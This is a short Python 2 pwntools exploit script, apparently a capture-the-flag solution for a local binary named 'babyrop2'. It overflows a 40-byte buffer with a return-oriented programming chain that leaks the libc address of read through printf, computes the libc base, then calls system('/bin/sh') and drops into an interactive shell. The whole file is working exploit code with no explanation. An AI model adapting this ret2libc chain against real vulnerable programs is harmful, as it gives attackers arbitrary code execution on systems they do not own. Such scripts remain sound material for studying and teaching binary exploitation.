from pwn import *

e = ELF('./babyrop2')
#libc = ELF('./libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./babyrop2')

printf_addr = e.symbols['printf']
pop_rdi_addr = 0x00400733
ret_addr = 0x004004d1

payload = 'A'*40
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(e.got['read'])
payload += p64(printf_addr)
payload += p64(e.symbols['_start'])

print p.recvuntil('name? ')
p.sendline(payload)
print p.recvline()
ret = u64(p.recvuntil('What')[:-4] + "\x00\x00")

print "ret: " + hex(ret)
libc_base_addr = ret - libc.symbols['read']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_sh = next(libc.search("/bin/sh")) + libc_base_addr

payload = 'A'*40
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_sh)
payload += p64(system_addr)

print "/bin/sh: " + hex(binsh_sh)
print "system: " + hex(system_addr)

print p.recvuntil('name? ')
p.sendline(payload)
p.interactive()